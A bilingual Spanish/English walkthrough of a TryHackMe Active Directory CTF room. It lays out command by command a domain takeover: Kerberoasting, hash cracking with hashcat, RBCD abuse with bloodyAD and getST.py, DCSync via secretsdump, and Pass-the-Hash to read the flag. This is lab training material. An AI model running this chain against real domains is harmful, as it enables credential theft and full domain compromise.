# Operation Endgame [HARD]

### Información de la Sala / Room Information

* **Dificultad / Difficulty:** HARD
* **Tipo / Type:** CTF
* **Slug:** `operationendgame`
* **Link:** https://tryhackme.com/room/operationendgame
* **Sección / Section:** 03 Level Hard
* **Fuente / Source:** Web (API THM `api/v2/rooms/tasks?roomCode=operationendgame` + websearch de walkthroughs)

## Solucionario de Tareas / Task Solutions

> **ES:** Sala de dominio **Active Directory** de dificultad Hard que remata en tomar el control del Domain Controller. La cadena arranca desde una cuenta `guest` casi sin privilegios: enumeración con BloodHound (rusthound-ce), **Kerberoasting** de la cuenta `CODY_ROY`, crackeo del TGS con hashcat, y el descubrimiento de que **guest tiene permisos anómalos** (misconfig intencionada) que permiten **GenericWrite** sobre la cuenta de máquina `AD$`. Con **Resource-Based Constrained Delegation (RBCD)** se falsifica un ticket como `Administrator` y, tras esparcir los permisos de DCSync, se vuelcan los hashes del DC para acabar con un **Pass-the-Hash** y leer la flag del escritorio de Administrator.
> **EN:** **Active Directory** room of Hard difficulty that ends with full control of the Domain Controller. The chain starts from an almost unprivileged `guest` account: BloodHound enumeration (rusthound-ce), **Kerberoasting** of the `CODY_ROY` account, cracking the TGS with hashcat, and the discovery that **guest has anomalous permissions** (intentional misconfiguration) enabling **GenericWrite** over the `AD$` machine account. Via **Resource-Based Constrained Delegation (RBCD)** a ticket is forged as `Administrator` and, after granting DCSync rights, the DC hashes are dumped to finish with a **Pass-the-Hash** and read the flag from Administrator's desktop.

### Task 1 - Find The Flag

> **ES:** 1 tarea (flag en el DC). Flujo: nmap → DC del dominio `thm.local` (Server 2019: 53/80/88/135/139/389/443/445/464/593/636/3268/3269/3389/7680/9389/47001). `nxc smb` como null → denied; como `guest` → solo lectura IPC$. `rusthound-ce` como guest → **BloodHound** → cuenta kerberoastable `CODY_ROY` (SPN `HTTP/server.secure.com`). `GetUserSPNs.py thm.local/guest -no-pass -request` → hash TGS `$krb5tgs$23$...` → `hashcat -m 13100` con rockyou → crack. Con `CODY_ROY` se descubre que **guest tiene permisos anómalos** (GenericWrite sobre la cuenta de máquina `AD$`, vía `bloodyAD get writable`). **RBCD**: `bloodyAD add rbcd "AD$" "CODY_ROY"` → `getST.py -spn "ldap/AD.THM.LOCAL" -impersonate Administrator` (S4U2Self + S4U2Proxy) → `bloodyAD add dcsync cody_roy` → `secretsdump.py -just-dc-user Administrator` → hashes → **PTH** → leer `C:\Users\Administrator\Desktop\flag.txt.txt` (smbclient/atexec). Pregunta: "What's the flag?" — los writeups la ocultan.
> **EN:** 1 task (flag on the DC). Flow: nmap → DC of domain `thm.local` (Server 2019: 53/80/88/135/139/389/443/445/464/593/636/3268/3269/3389/7680/9389/47001). `nxc smb` as null → denied; as `guest` → IPC$ READ only. `rusthound-ce` as guest → **BloodHound** → kerberoastable account `CODY_ROY` (SPN `HTTP/server.secure.com`). `GetUserSPNs.py thm.local/guest -no-pass -request` → TGS hash `$krb5tgs$23$...` → `hashcat -m 13100` with rockyou → crack. With `CODY_ROY`, it turns out **guest has anomalous permissions** (GenericWrite over the `AD$` machine account, via `bloodyAD get writable`). **RBCD**: `bloodyAD add rbcd "AD$" "CODY_ROY"` → `getST.py -spn "ldap/AD.THM.LOCAL" -impersonate Administrator` (S4U2Self + S4U2Proxy) → `bloodyAD add dcsync cody_roy` → `secretsdump.py -just-dc-user Administrator` → hashes → **PTH** → read `C:\Users\Administrator\Desktop\flag.txt.txt` (smbclient/atexec). One question: "What's the flag?" — walkthroughs keep it hidden.

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| What's the flag? | `THM{...redacted...}` |

> **Nota / Note:** El flag está en `C:\Users\Administrator\Desktop\flag.txt.txt` del DC, obtenido por Pass-the-Hash. Los walkthroughs públicos lo ocultan; se documenta el método completo, no el valor literal.
> **EN:** The flag is on `C:\Users\Administrator\Desktop\flag.txt.txt` on the DC, obtained via Pass-the-Hash. Public walkthroughs mask it; the full method is documented, not the literal value.

## Metodología / Methodology

1. **Paso / Step - Reconocimiento:** `nmap` → DC Windows Server 2019 (dominio `thm.local`) con DNS (53), HTTP (80/443), Kerberos (88), SMB (139/445), RPC (135/593), LDAP (389/636/3268/3269), RDP (3389), WSMAN (47001), etc.
2. **Paso / Step - Acceso inicial como guest:** `nxc smb <IP> -u '' -p ''` → null session denegada. `nxc smb <IP> -u guest -p ''` → acceso con `IPC$` en modo solo lectura.
3. **Paso / Step - Enumeración con BloodHound:** `rusthound-ce -d thm.local -u guest -p ''` recolecta datos con el mínimo privilegio → se importan en BloodHound.
4. **Paso / Step - Kerberoasting:** BloodHound señala a `CODY_ROY` como kerberoastable (SPN `HTTP/server.secure.com`). `GetUserSPNs.py thm.local/guest -no-pass -request` → hash TGS `$krb5tgs$23$...`.
5. **Paso / Step - Crack del TGS:** `hashcat -m 13100 hash rockyou.txt` → password de `CODY_ROY` recuperada.
6. **Paso / Step - Descubrir la anomalía:** Con credenciales de `CODY_ROY`, `bloodyAD get writable` revela que **guest tiene permisos desproporcionados**: **GenericWrite** sobre la cuenta de máquina `AD$` (misconfig intencionada de la sala).
7. **Paso / Step - RBCD:** `bloodyAD add rbcd "AD$" "CODY_ROY"` añade a `CODY_ROY` como delegado de servicios permitido en `AD$`.
8. **Paso / Step - Impersonar a Administrator:** `getST.py -spn "ldap/AD.THM.LOCAL" -impersonate Administrator -dc-ip <IP> thm.local/cody_roy:<pass>` → S4U2Self + S4U2Proxy → TGT/ticket de Administrador para el LDAP.
9. **Paso / Step - DCSync:** `bloodyAD add dcsync cody_roy` concede permisos de DCSync a `cody_roy` → `secretsdump.py -just-dc-user Administrator -k -no-pass thm.local/Administrator@<IP>` vuelca los hashes.
10. **Paso / Step - Pass-the-Hash → flag:** Con el NT hash de Administrator: `smbclient //<IP>/C$ -U Administrator --pw-nt-hash` (o `atexec`) → leer `C:\Users\Administrator\Desktop\flag.txt.txt` → flag.

### Cadena de ataque / Attack Chain

```
guest (sin password / null denegada)
  -> rusthound-ce + BloodHound
  -> usuario kerberoastable CODY_ROY (SPN HTTP/server.secure.com)
  -> GetUserSPNs.py thm.local/guest -no-pass -request -> $krb5tgs$23$...
  -> hashcat -m 13100 + rockyou -> crack CODY_ROY
  -> anomalia de permisos: guest tiene GenericWrite sobre AD$ (misconfig)
  -> bloodyAD add rbcd "AD$" "CODY_ROY"     (Resource-Based Constrained Delegation)
  -> getST.py -spn ldap/AD.THM.LOCAL -impersonate Administrator (S4U2Self+S4U2Proxy)
  -> bloodyAD add dcsync cody_roy
  -> secretsdump.py -just-dc-user Administrator -> hashes NT de Admin
  -> Pass-the-Hash (smbclient/atexec) -> C:\Users\Administrator\Desktop\flag.txt.txt -> flag
```

**Lección:** Una cuenta `guest` con permisos delegados desproporcionados convierte un simple Kerberoast en un dominio totalmente comprometido: el abuso de la delegación basada en recursos (RBCD) permite impersonar a `Administrator` sin conocer su password y transformar eso en DCSync y Pass-the-Hash. En AD, lo que importa no es quién "crees" que es guest, sino qué ACLs cuelgan de ella.

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.